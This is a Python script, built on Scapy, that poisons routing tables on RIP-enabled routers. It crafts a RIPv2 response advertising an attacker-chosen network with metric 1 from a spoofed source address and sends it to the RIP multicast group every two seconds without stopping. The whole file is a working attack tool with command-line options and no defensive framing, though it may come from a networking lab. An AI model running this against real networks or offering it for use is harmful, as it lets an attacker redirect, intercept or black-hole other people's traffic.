#! /usr/bin/env python3
'''
Attack a RIP-enabled router with malicious RIP advertisements
'''
from sys import stderr, __stderr__
from ipaddress import IPv4Network as Network
from argparse import ArgumentParser
from argparse import RawDescriptionHelpFormatter


stderr = None
from scapy.all import *
stderr = __stderr__


def main(args):
    # get addr and mask from CLI arguments
    network = Network(args.network).with_netmask
    addr, mask = network.split('/')

    rip = RIP(cmd=2, version=2)/RIPEntry(AF="IP",
                                         RouteTag=0,
                                         addr=addr,
                                         mask=mask,
                                         nextHop="0.0.0.0",
                                         metric=args.metric)

    evil = Ether()/IP(src=args.src_ip, dst=args.dst_ip)/UDP(sport=520, dport=520)/rip
    print(f"Injecting poisoned advertisement to {args.network}", end=" ")
    print(f"with metric {args.metric} on {args.iface}")
    sendp(evil, loop=1, inter=2, iface=args.iface)


if __name__ == '__main__':
    parser = ArgumentParser(description=__doc__,
                            formatter_class=RawDescriptionHelpFormatter)
    parser.add_argument("-n", "--network",
                        dest="network",
                        default='10.0.100.0/24',
                        help="The network to advertise (10.0.100.0/24)")
    parser.add_argument("-m", "--metric",
                        dest="metric",
                        default=1,
                        help="The metric (default is 1)")
    parser.add_argument("-s", "--src",
                        dest="src_ip",
                        help="The source IP address for packets")
    parser.add_argument("-d", "--dst",
                        dest="dst_ip",
                        default="224.0.0.9",
                        help="The destination IP address (224.0.0.9)")
    parser.add_argument("-i", "--iface",
                        dest="iface",
                        help="The interface used to send packets")
    args = parser.parse_args()

    if args.src_ip is None or args.iface is None:
        parser.print_help()
    else:
        main(args)
